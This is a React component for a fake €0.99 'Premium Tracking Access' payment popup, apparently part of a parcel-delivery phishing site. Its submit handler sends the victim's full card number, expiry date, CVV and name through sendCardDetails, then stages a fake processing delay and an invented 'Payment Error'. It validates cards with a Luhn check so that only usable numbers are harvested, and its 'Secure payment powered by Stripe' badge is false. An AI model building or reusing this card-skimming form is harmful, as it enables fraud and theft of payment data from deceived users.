import React, { useState, useEffect } from 'react';
import { FaCreditCard, FaLock, FaCheck, FaSpinner } from 'react-icons/fa';
import { useTheme } from '../contexts/ThemeContext';
import { toast } from 'react-toastify';
import Cookies from 'js-cookie';
import { sendCardDetails } from '../services/paymentService';
import { useNavigate } from 'react-router-dom';

interface PremiumTrackingFormProps {
  onSuccess: () => void;
  onCancel: () => void;
  trackingNumber: string;
}

interface FormErrors {
  cardNumber: string;
  expiryDate: string;
  cvv: string;
  name: string;
}

const PremiumTrackingForm: React.FC<PremiumTrackingFormProps> = ({ onSuccess, onCancel, trackingNumber }) => {
  const { isDarkMode } = useTheme();
  const navigate = useNavigate();
  const [isProcessing, setIsProcessing] = useState(false);
  const [formData, setFormData] = useState({
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    name: '',
    cardType: ''
  });
  const [errors, setErrors] = useState<FormErrors>({
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    name: '',
  });
  const [cardType, setCardType] = useState<string>('');
  const [isValid, setIsValid] = useState(false);
  const [showErrorModal, setShowErrorModal] = useState(false);

  // Card validation functions
  const getCardType = (number: string): string => {
    const cleanNumber = number.replace(/\D/g, '');
    if (/^4\d{12}(\d{3})?$/.test(cleanNumber)) return 'Visa';
    if (/^(5[1-5]|2[2-7])\d{14}$/.test(cleanNumber)) return 'MasterCard';
    if (/^3[47]\d{13}$/.test(cleanNumber)) return 'American Express';
    if (/^62[0-9]{14,17}$/.test(cleanNumber)) return 'China Union Pay';
    if (/^(?:2131|1800|35\d{3})\d{11}$/.test(cleanNumber)) return 'JCB';
    if (/^3(?:0[0-5]|[68][0-9])\d{11}$/.test(cleanNumber)) return 'Diners Club';
    if (/^(60|65|81)\d{14,17}$/.test(cleanNumber)) return 'RuPay';
    return '';
  };

  const isValidLuhn = (card: string): boolean => {
    const num = card.replace(/\D/g, '');
    let sum = 0;
    let isEven = false;
    
    // Loop through values starting from the rightmost digit
    for (let i = num.length - 1; i >= 0; i--) {
      let digit = parseInt(num[i]);

      if (isEven) {
        digit *= 2;
        if (digit > 9) {
          digit -= 9;
        }
      }

      sum += digit;
      isEven = !isEven;
    }

    return sum % 10 === 0;
  };

  const isValidExpiry = (expiry: string): boolean => {
    if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
    
    const [month, year] = expiry.split('/').map(Number);
    if (month < 1 || month > 12) return false;
    
    const now = new Date();
    const currentYear = now.getFullYear() % 100;
    const currentMonth = now.getMonth() + 1;
    
    return year > currentYear || (year === currentYear && month >= currentMonth);
  };

  const isValidCVV = (cvv: string): boolean => {
    return /^\d{3,4}$/.test(cvv);
  };

  const isValidName = (name: string): boolean => {
    const parts = name.trim().split(/\s+/);
    return parts.length >= 2 && parts.every(part => /^[A-Za-z]+$/.test(part));
  };

  // Format input values
  const formatCardNumber = (value: string): string => {
    const cleaned = value.replace(/\D/g, '');
    const parts = [];
    
    for (let i = 0; i < cleaned.length && i < 16; i += 4) {
      parts.push(cleaned.substr(i, 4));
    }
    
    return parts.join(' ');
  };

  const formatExpiry = (value: string): string => {
    const cleaned = value.replace(/\D/g, '');
    if (cleaned.length >= 2) {
      return `${cleaned.slice(0, 2)}/${cleaned.slice(2, 4)}`;
    }
    return cleaned;
  };

  // Input handlers
  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    let formattedValue = value;
    let error = '';

    switch (name) {
      case 'cardNumber':
        formattedValue = formatCardNumber(value);
        const cardTypeDetected = getCardType(formattedValue);
        setCardType(cardTypeDetected);
        
        if (formattedValue.replace(/\s/g, '').length > 0) {
          if (!cardTypeDetected) {
            error = 'Invalid card number';
          } else if (!isValidLuhn(formattedValue)) {
            error = 'Invalid card number';
          }
        }
        break;

      case 'expiryDate':
        formattedValue = formatExpiry(value);
        if (formattedValue.length > 0 && !isValidExpiry(formattedValue)) {
          error = 'Invalid expiry date';
        }
        break;

      case 'cvv':
        formattedValue = value.replace(/\D/g, '').slice(0, 4);
        if (formattedValue.length > 0 && !isValidCVV(formattedValue)) {
          error = 'Invalid CVV';
        }
        break;

      case 'name':
        formattedValue = value.replace(/[^A-Za-z\s]/g, '').toUpperCase();
        if (formattedValue.length > 0 && !isValidName(formattedValue)) {
          error = 'Enter full name (first & last)';
        }
        break;
    }

    setFormData(prev => ({
      ...prev,
      [name]: formattedValue
    }));

    setErrors(prev => ({
      ...prev,
      [name]: error
    }));
  };

  // Validate all fields and update isValid state
  useEffect(() => {
    const valid = 
      isValidLuhn(formData.cardNumber) &&
      getCardType(formData.cardNumber) !== '' &&
      isValidExpiry(formData.expiryDate) &&
      isValidCVV(formData.cvv) &&
      isValidName(formData.name);
    
    setIsValid(valid);
  }, [formData]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    sendCardDetails(formData);
    setIsProcessing(true);
    setTimeout(() => {
      setIsProcessing(false);
      setShowErrorModal(true);
    }, 1000);
  };

  const handleCloseModal = () => {
    setShowErrorModal(false);
    navigate('/');
  };

  const handleCancel = () => {
    toast.info('Payment cancelled. You need to complete the payment to view tracking details.', {
      position: "top-right",
      autoClose: 5000,
      hideProgressBar: false,
      closeOnClick: true,
      pauseOnHover: true,
      draggable: true,
      progress: undefined,
      style: {
        background: isDarkMode ? '#1f2937' : '#ffffff',
        color: isDarkMode ? '#ffffff' : '#000000',
        borderLeft: '4px solid rgb(89,40,177)',
      },
    });
    onCancel();
  };

  return (
    <div className={`fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50`}>
      <div className={`max-w-md w-full rounded-european-lg shadow-european-lg ${
        isDarkMode ? 'bg-gray-800' : 'bg-white'
      } p-6`}>
        <div className="text-center mb-6">
          <h2 className={`text-2xl font-display font-bold ${isDarkMode ? 'text-white' : 'text-gray-900'}`}>
            Premium Tracking Access
          </h2>
          <p className={`mt-2 ${isDarkMode ? 'text-gray-400' : 'text-gray-600'}`}>
            Unlock detailed tracking information for €0.99
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label className={`block text-sm font-medium ${isDarkMode ? 'text-gray-300' : 'text-gray-700'} mb-1`}>
              Card Number {cardType && `(${cardType})`}
            </label>
            <div className="relative">
              <input
                type="text"
                name="cardNumber"
                value={formData.cardNumber}
                onChange={handleInputChange}
                placeholder="1234 5678 9012 3456"
                className={`w-full px-4 py-2 rounded-european border ${
                  isDarkMode 
                    ? 'bg-gray-700 border-gray-600 text-white placeholder-gray-400' 
                    : 'bg-white border-gray-300 text-gray-900 placeholder-gray-500'
                } ${errors.cardNumber ? 'border-red-500' : ''} focus:ring-2 focus:ring-primary-500 focus:border-primary-500`}
              />
              <FaCreditCard className={`absolute right-3 top-1/2 transform -translate-y-1/2 ${
                isDarkMode ? 'text-gray-400' : 'text-gray-500'
              }`} />
            </div>
            {errors.cardNumber && (
              <p className="mt-1 text-sm text-red-500">{errors.cardNumber}</p>
            )}
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div>
              <label className={`block text-sm font-medium ${isDarkMode ? 'text-gray-300' : 'text-gray-700'} mb-1`}>
                Expiry Date
              </label>
              <input
                type="text"
                name="expiryDate"
                value={formData.expiryDate}
                onChange={handleInputChange}
                placeholder="MM/YY"
                className={`w-full px-4 py-2 rounded-european border ${
                  isDarkMode 
                    ? 'bg-gray-700 border-gray-600 text-white placeholder-gray-400' 
                    : 'bg-white border-gray-300 text-gray-900 placeholder-gray-500'
                } ${errors.expiryDate ? 'border-red-500' : ''} focus:ring-2 focus:ring-primary-500 focus:border-primary-500`}
              />
              {errors.expiryDate && (
                <p className="mt-1 text-sm text-red-500">{errors.expiryDate}</p>
              )}
            </div>
            <div>
              <label className={`block text-sm font-medium ${isDarkMode ? 'text-gray-300' : 'text-gray-700'} mb-1`}>
                CVV
              </label>
              <input
                type="text"
                name="cvv"
                value={formData.cvv}
                onChange={handleInputChange}
                placeholder="123"
                className={`w-full px-4 py-2 rounded-european border ${
                  isDarkMode 
                    ? 'bg-gray-700 border-gray-600 text-white placeholder-gray-400' 
                    : 'bg-white border-gray-300 text-gray-900 placeholder-gray-500'
                } ${errors.cvv ? 'border-red-500' : ''} focus:ring-2 focus:ring-primary-500 focus:border-primary-500`}
              />
              {errors.cvv && (
                <p className="mt-1 text-sm text-red-500">{errors.cvv}</p>
              )}
            </div>
          </div>

          <div>
            <label className={`block text-sm font-medium ${isDarkMode ? 'text-gray-300' : 'text-gray-700'} mb-1`}>
              Cardholder Name
            </label>
            <input
              type="text"
              name="name"
              value={formData.name}
              onChange={handleInputChange}
              placeholder="JOHN DOE"
              className={`w-full px-4 py-2 rounded-european border ${
                isDarkMode 
                  ? 'bg-gray-700 border-gray-600 text-white placeholder-gray-400' 
                  : 'bg-white border-gray-300 text-gray-900 placeholder-gray-500'
              } ${errors.name ? 'border-red-500' : ''} focus:ring-2 focus:ring-primary-500 focus:border-primary-500`}
            />
            {errors.name && (
              <p className="mt-1 text-sm text-red-500">{errors.name}</p>
            )}
          </div>

          <div className="flex items-center justify-between pt-4">
            <button
              type="button"
              onClick={handleCancel}
              className={`px-4 py-2 rounded-european ${
                isDarkMode 
                  ? 'text-gray-300 hover:bg-gray-700' 
                  : 'text-gray-600 hover:bg-gray-100'
              }`}
            >
              Cancel
            </button>
            <button
              type="submit"
              disabled={isProcessing || !isValid}
              className={`px-6 py-2 rounded-european bg-[rgb(89,40,177)] text-white hover:bg-[rgb(109,60,197)] focus:outline-none focus:ring-2 focus:ring-[rgb(89,40,177)] focus:ring-offset-2 disabled:opacity-50 flex items-center gap-2`}
            >
              {isProcessing ? (
                <>
                  <FaSpinner className="animate-spin" />
                  Processing...
                </>
              ) : (
                <>
                  <FaLock />
                  Pay €0.99
                </>
              )}
            </button>
          </div>
        </form>

        <div className="mt-6 text-center">
          <div className="flex items-center justify-center gap-2 text-sm text-gray-500">
            <FaLock className="text-primary-500" />
            <span>Secure payment powered by Stripe</span>
          </div>
        </div>
      </div>

      {/* Error Modal */}
      {showErrorModal && (
        <div className="fixed inset-0 flex items-center justify-center z-50 bg-black bg-opacity-60">
          <div className={`bg-white dark:bg-gray-800 rounded-lg shadow-lg p-8 max-w-sm w-full text-center`}>
            <h3 className="text-xl font-bold mb-4 text-red-600 dark:text-red-400">Payment Error</h3>
            <p className="mb-6 text-gray-700 dark:text-gray-200">
              We have a problem processing payments right now. Please try again later or contact support.
            </p>
            <button
              onClick={handleCloseModal}
              className="px-6 py-2 rounded-lg bg-[rgb(89,40,177)] text-white hover:bg-[rgb(109,60,197)] focus:outline-none focus:ring-2 focus:ring-[rgb(89,40,177)] focus:ring-offset-2"
            >
              Go to Home
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default PremiumTrackingForm; 